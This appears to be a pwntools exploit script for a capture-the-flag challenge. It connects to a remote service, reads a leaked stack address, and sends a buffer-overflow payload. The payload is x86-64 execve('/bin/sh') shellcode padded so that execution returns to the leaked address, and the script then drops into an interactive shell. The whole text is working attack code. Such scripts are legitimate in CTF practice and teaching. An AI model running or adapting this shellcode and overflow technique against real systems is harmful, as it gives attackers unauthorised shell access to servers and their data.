from pwn import *
context.log_level = 'debug'
# p  = process("./a.out")
# gdb.attach(p)
p=remote('10.10.175.204',9995)


p.recvuntil(b"TO SAY SOMETHING\n")
p.sendline(str(1))

p.recvuntil(b"DO YOU WANNA HAVE A TYR?(0/1)\n")
p.sendline(str(0))
say = int(p.recv(14),16)
print('say' + hex(say))
p.recvuntil(b"Thanks!What gift do you want!\n")
sh =b"\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05"
payload  = sh.ljust(0x20,'\0') + b"deadbeef" + p64(say)
p.sendline(payload)


p.interactive()